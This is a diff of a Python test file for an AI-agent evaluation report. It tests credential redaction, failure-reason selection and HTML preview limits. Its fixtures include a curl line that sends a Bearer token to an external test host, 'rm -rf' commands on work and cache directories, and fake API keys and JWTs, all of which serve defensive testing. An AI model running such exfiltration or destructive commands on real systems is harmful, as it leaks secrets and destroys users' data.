@@ -11,6 +11,7 @@ carries the same reason as a tooltip. Both surfaces are redacted and bounded.
 from __future__ import annotations
 
 import copy
+import html as html_lib
 import json
 import re
 from typing import TYPE_CHECKING, Any
@@ -227,12 +228,22 @@ def test_credentials_are_redacted_from_reasons_and_excerpts() -> None:
         _finding(f"curl -H 'Authorization: Bearer {leaked}' https://api.example.test"),
         reason=f"Agent sent {leaked} to an external host",
     )
+    # Failing behavior results reach the card as ``failures``.
+    details["security"]["results"] = [{"passed": False, "reason": f"Agent printed {leaked} to stdout"}]
     payload = _payload([_reward(details=details)])
 
     card_evidence = _security_card(payload)["evidence"][0]
+    assert card_evidence["failures"] == ["Agent printed sk-<redacted> to stdout"]
     assert leaked not in json.dumps(card_evidence)
     assert leaked not in json.dumps(payload["trials"])
     assert leaked not in _render(payload)
+
+
+def test_credential_glued_to_a_word_is_redacted() -> None:
+    # Only the log-line pass masks a key glued to a preceding word character.
+    glued = "xsk-aaaaaaaaaaaaaaaaaaaaAAA1"
+
+    assert sanitize_grader_text(f"Agent printed {glued} to stdout") == "Agent printed xsk-<redacted> to stdout"
 
 
 def test_configured_credential_values_are_redacted_from_both_arms(monkeypatch: pytest.MonkeyPatch) -> None:
@@ -259,7 +270,55 @@ def test_whitespace_padding_cannot_expose_a_clipped_credential_prefix() -> None:
     padded = " " * (_MAX_SCAN_CHARS - 10) + "sk-aaaaaaaaaaaaaaaaaaaaAAA"
 
     assert sanitize_grader_text(padded) == "sk-<redacted>"
-    assert len(sanitize_grader_text("x" * (3 * _MAX_SCAN_CHARS))) == _MAX_SCAN_CHARS
+    # A word cut at the window edge is dropped rather than sliced.
+    assert sanitize_grader_text("x" * (3 * _MAX_SCAN_CHARS)) == ""
+    assert sanitize_grader_text("kept " + "x" * _MAX_SCAN_CHARS) == "kept"
+
+
+def _jwt(payload_chars: int) -> str:
+    return f"eyJhbGciOiJIUzI1NiJ9.eyJ{'A' * payload_chars}.{'s' * 43}"
+
+
+def test_credential_cut_at_the_scan_window_is_dropped_not_sliced(monkeypatch: pytest.MonkeyPatch) -> None:
+    # Eleven ~1.5 KB JWTs (an echoed env dump) put a configured credential with no
+    # recognizable shape across the scan window edge. Redacting the JWTs
+    # shortens the text before it, which used to pull the credential's first 20
+    # characters into the visible reason, excerpt and card note.
+    configured = "cutvaluecutvaluecutvaluecutvalue"
+    monkeypatch.setenv("SKILL_EVAL_LLM_API_KEY", configured)
+    words = [_jwt(1_440) for _ in range(10)]
+    filler = _MAX_SCAN_CHARS - 20 - sum(len(word) + 1 for word in words) - 1
+    words.append(_jwt(filler - len(_jwt(0))))
+    text = " ".join([*words, configured])
+    assert text.index(configured) == _MAX_SCAN_CHARS - 20
+
+    for visible in (
+        failure_reason({"reason": text}),
+        failure_excerpt({"evidence": text}),
+        sanitize_grader_text(text)[:512],
+    ):
+        assert visible.endswith("jwt-<redacted>")
+        assert configured[:8] not in visible
+
+
+def test_line_break_ends_a_masked_assignment() -> None:
+    # A ``key: value`` assignment is masked to the end of its line; collapsing
+    # the line break first used to mask the explanation that follows.
+    reason = "auth_token: missing\nThe agent hardcoded the login response instead of calling the endpoint"
+    details = {"security": {"passed": False, "score": 0.0, "reason": reason, "findings": []}}
+    payload = _payload([_reward(details=details)])
+
+    expected = "auth_token:<redacted>\nThe agent hardcoded the login response instead of calling the endpoint"
+    assert sanitize_grader_text(reason) == expected
+    assert (
+        failure_reason({"message": reason, "attribution_explanation": "Skill-caused."}) == f"{expected}; Skill-caused."
+    )
+    assert _security_card(payload)["evidence"][0]["notes"] == [expected]
+    assert payload["trials"][0]["score_reasons"] == {"security": expected}
+    html = _render(payload)
+    assert "The agent hardcoded the login response" in _security_evidence_html(html)
+    assert f'title="Security: {html_lib.escape(expected)}"' in _drilldown_table(html)
+    assert sanitize_grader_text("one \r\n\t two  \n\n three\tfour") == "one\ntwo\nthree four"
 
 
 def test_evidence_markup_is_escaped_exactly_once() -> None:
@@ -317,6 +376,95 @@ def test_multi_row_trial_takes_reason_from_failing_row() -> None:
     trial = payload["trials"][0]
     assert trial["scores"]["security"] == 0.5
     assert trial["score_reasons"] == {"security": DESTRUCTIVE_REASON}
+
+
+def _scored_security_details(reason: str, score: float) -> dict[str, Any]:
+    return {"security": {"passed": False, "score": score, "reason": reason, "findings": []}}
+
+
+def test_multi_row_trial_takes_reason_from_lowest_scoring_failing_row() -> None:
+    payload = _payload(
+        [
+            _reward(security=0.5, details=_scored_security_details("Reason A: partial leak", 0.5)),
+            _reward(security=0.0, details=_scored_security_details("Reason B: destructive command", 0.0)),
+        ]
+    )
+
+    assert payload["trials"][0]["score_reasons"] == {"security": "Reason B: destructive command"}
+
+
+def test_card_shows_lowest_scoring_failing_attempt_reason() -> None:
+    payload = _payload(
+        [
+            _reward(
+                trial_id="case-1__attempt1",
+                security=0.5,
+                details=_scored_security_details("Reason A: partial leak", 0.5),
+            ),
+            _reward(
+                trial_id="case-1__attempt2",
+                security=0.0,
+                details=_scored_security_details("Reason B: destructive command", 0.0),
+            ),
+        ]
+    )
+
+    evidence_html = _security_evidence_html(_render(payload))
+
+    assert "Reason B: destructive command" in evidence_html
+    assert "Reason A: partial leak" not in evidence_html
+
+
+def test_card_lists_failed_behavior_results_once() -> None:
+    # judge_behavior_check records the judge summary as ``reason``, which can be empty.
+    failed = ["Did not cite the source document", "Deleted files without asking"]
+    details = {
+        "behavior_check": {
+            "passed": False,
+            "reason": "",
+            "results": [
+                {"behavior": f"b{index}", "passed": False, "reason": text} for index, text in enumerate(failed)
+            ],
+        }
+    }
+    payload = _payload([_reward(security=1.0, behavior_check=0.0, details=details)])
+
+    card = next(card for card in payload["agents"]["codex"]["evaluator_cards"] if card["id"] == "behavior_check")
+    assert card["evidence"][0]["failures"] == failed
+    assert "reason" not in card["evidence"][0]
+    # The drill-down tooltip has no separate failures list, so it keeps them.
+    assert payload["trials"][0]["score_reasons"] == {"behavior_check": "; ".join(failed)}
+    match = re.search(
+        r'<div class="t3-eval-title">Behavior Check</div>.*?(<details class="t3-eval-evidence".*?</details>)',
+        _render(payload),
+        re.DOTALL,
+    )
+    assert match is not None
+    for text in failed:
+        assert match.group(1).count(text) == 1
+
+
+def test_attempts_quoting_different_commands_share_one_card_entry_per_case() -> None:
+    # The security grader writes one fixed reason per finding label and quotes
+    # the command, which differs per attempt, in the finding evidence.
+    rewards = [
+        _reward(
+            entry_id=f"case-{case}",
+            trial_id=f"case-{case}__attempt{attempt}",
+            details=_security_details(_finding(f"rm -rf /tmp/build-{case}-{attempt} ~/work")),
+        )
+        for case in range(8)
+        for attempt in range(3)
+    ]
+    payload = _payload(rewards)
+
+    card = _security_card(payload)
+    assert [entry["entry_id"] for entry in card["evidence"]] == [f"case-{case}" for case in range(8)]
+    assert [entry["occurrences"] for entry in card["evidence"]] == [3] * 8
+    assert card["evidence"][0]["excerpt"] == "rm -rf /tmp/build-0-0 ~/work"
+    assert "evidence_sampling" not in card
+    assert "evidence_entries" not in payload.get("report_truncation", {}).get("omitted", {})
+    assert "Per-trial evidence (8 cases, 24 trials)" in _render(payload)
 
 
 def test_reason_deduplicates_after_redaction() -> None:
@@ -392,6 +540,27 @@ def test_reason_reads_plain_string_findings() -> None:
     assert failure_reason({"findings": ["Wrote outside the workspace", 7]}) == "Wrote outside the workspace"
 
 
+def test_reason_names_the_type_of_a_finding_without_message() -> None:
+    finding = {"type": "dangerous_command", "evidence": "rm -rf /cache", "score_impact": True}
+    attribution = "The skill told the agent to delete the cache."
+
+    assert failure_reason({"findings": [finding]}) == "dangerous_command"
+    assert failure_reason({"findings": [finding] * 8, "attribution_explanation": attribution}) == "dangerous_command"
+
+
+def test_blank_candidates_do_not_count_toward_the_candidate_cap() -> None:
+    blank = {"evidence": "rm -rf /cache", "score_impact": True}
+    attribution = "The skill told the agent to delete the cache."
+    detail = {
+        "reason": "  ",
+        "findings": [blank] * 8,
+        "results": [{"passed": False}] * 8,
+        "attribution_explanation": attribution,
+    }
+
+    assert failure_reason(detail) == attribution
+
+
 def test_reason_redacts_a_bounded_number_of_candidates() -> None:
     repeated = [{"message": "Same destructive command", "score_impact": True}] * 64
     detail = {"findings": [*repeated, {"message": "Late finding", "score_impact": True}]}
@@ -405,7 +574,7 @@ def test_excerpt_skips_passing_findings_and_falls_back_to_detail_evidence() -> N
         "evidence": "  multi\n  line   excerpt ",
     }
 
-    assert failure_excerpt(detail) == "multi line excerpt"
+    assert failure_excerpt(detail) == "multi\nline excerpt"
     assert failure_excerpt({"findings": "not-a-list"}) == ""
     assert failure_reason("not-a-dict") == ""
 
@@ -467,6 +636,11 @@ def _reason_count(payload: dict[str, Any]) -> int:
     return len(list(failure_reason_text_slots(payload)))
 
 
+def _rendered_reason_count(payload: dict[str, Any]) -> int:
+    """Reasons the page renders: agents' cards and drill-down rows, not the top-level card copy."""
+    return len(list(failure_reason_text_slots(payload, include_top_level_cards=False)))
+
+
 def _compact_size(value: object) -> int:
     return len(json.dumps(value, ensure_ascii=False, separators=(",", ":")).encode("utf-8"))
 
@@ -484,7 +658,8 @@ def test_html_preview_keeps_the_overview_when_failure_reasons_overflow_it() -> N
     # trigger. Reasons must not spend the preview budget ahead of the overview.
     payload = _failing_multi_agent_payload(2, 40)
     data = _display_data(payload)
-    total = _reason_count(data)
+    all_reasons = _reason_count(data)
+    total = _rendered_reason_count(data)
     assert _compact_size(data) > html_module._TIER3_HTML_PREVIEW_TRIGGER_BYTES
 
     preview, notice = html_module._bounded_tier3_preview(data)
@@ -494,11 +669,13 @@ def test_html_preview_keeps_the_overview_when_failure_reasons_overflow_it() -> N
     assert _overview_ids(preview) == _overview_ids(data)
     assert data["best_agent"] and all(_overview_ids(data)[1])
     assert set(notice) == {"failure_reasons"}
-    kept = _reason_count(preview)
+    # The preview drops the unrendered top-level card copy without counting it.
+    assert _reason_count(preview) == _rendered_reason_count(preview)
+    kept = _rendered_reason_count(preview)
     assert 0 < kept < total
     assert kept + notice["failure_reasons"] == total
     # The canonical payload embedded next to the preview keeps every reason.
-    assert _reason_count(data) == total
+    assert _reason_count(data) == all_reasons > total
 
     html = _render(payload)
     assert f"HTML preview left out {notice['failure_reasons']} failure reasons or excerpts" in html
@@ -507,8 +684,9 @@ def test_html_preview_keeps_the_overview_when_failure_reasons_overflow_it() -> N
 
 
 def test_html_preview_drops_failure_reasons_before_bounding_a_large_payload() -> None:
-    data = _display_data(_failing_multi_agent_payload(3, 60))
-    total = _reason_count(data)
+    payload = _failing_multi_agent_payload(3, 60)
+    data = _display_data(payload)
+    total = _rendered_reason_count(data)
 
     preview, notice = html_module._bounded_tier3_preview(data)
 
@@ -516,6 +694,67 @@ def test_html_preview_drops_failure_reasons_before_bounding_a_large_payload() ->
     assert notice["failure_reasons"] == total
     assert _reason_count(preview) == 0
     assert preview["best_agent"] == data["best_agent"] != ""
+    # 180 with-skill rows across agents and 60 baseline rows per agent: the walk
+    # keeps 64 of each.
+    assert notice["trial_rows"] == 180 - 64
+
+    html = _render(payload)
+    # The character count depends on the environment, so it comes from the notice.
+    assert f"HTML preview omitted {notice['characters']} characters and {notice['items']} items." in html
+    assert f"HTML preview left out {total} failure reasons or excerpts" in html
+    assert f"The HTML preview left out {notice['trial_rows']} per-trial rows" in html
+
+
+def test_html_preview_does_not_report_unrendered_top_level_card_reasons() -> None:
+    # The page renders every reason of this run; only the top-level card copy,
+    # which the page never shows, did not fit.
+    payload = _failing_multi_agent_payload(2, 36)
+    data = _display_data(payload)
+    assert _compact_size(data) > html_module._TIER3_HTML_PREVIEW_TRIGGER_BYTES
+
+    preview, notice = html_module._bounded_tier3_preview(data)
+
+    assert preview is not None
+    assert notice == {}
+    assert _rendered_reason_count(preview) == _rendered_reason_count(data)
+    html = _render(payload)
+    assert "HTML preview left out" not in html
+    assert "HTML preview omitted" not in html
+
+
+def test_row_cap_note_appears_only_when_drilldown_rows_were_capped() -> None:
+    rewards = [_reward(entry_id=f"case-{index}", trial_id=f"case-{index}__attempt1") for index in range(20)]
+    baseline = [_reward(entry_id=f"case-{index}", trial_id=f"case-{index}__baseline1") for index in range(20)]
+    infos = {
+        "codex": {
+            "execution_status": "succeeded",
+            "expected_attempts": 40,
+            "scored_attempts": 40,
+            "with_skill": _mean_scores(rewards),
+            "without_skill": _mean_scores(baseline),
+            "rewards": rewards,
+            "rewards_baseline": baseline,
+            "num_trials": 20,
+            "num_trials_baseline": 20,
+        }
+    }
+    # A large dataset alone pushes the display payload over the preview trigger.
+    dataset = [{"id": f"case-{index}", "prompt": f"Prompt {index}: " + "p" * 3_000} for index in range(100)]
+    payload = build_agent_eval_payload("demo", infos, dataset=dataset, use_llm_judge=False)
+    assert payload is not None
+    data = _display_data(payload)
+    assert _compact_size(data) > html_module._TIER3_HTML_PREVIEW_TRIGGER_BYTES
+
+    preview, notice = html_module._bounded_tier3_preview(data)
+
+    assert preview is not None
+    assert notice.get("items", 0) > 0
+    assert "trial_rows" not in notice
+    html = _render(payload)
+    assert "per-trial row" not in html
+    table = _drilldown_table(html)
+    assert table.count("<td>With skill</td>") == 20
+    assert table.count("<td>Without skill</td>") == 20
 
 
 def test_canonical_budget_drops_failure_reasons_before_recorded_evidence(monkeypatch: pytest.MonkeyPatch) -> None:
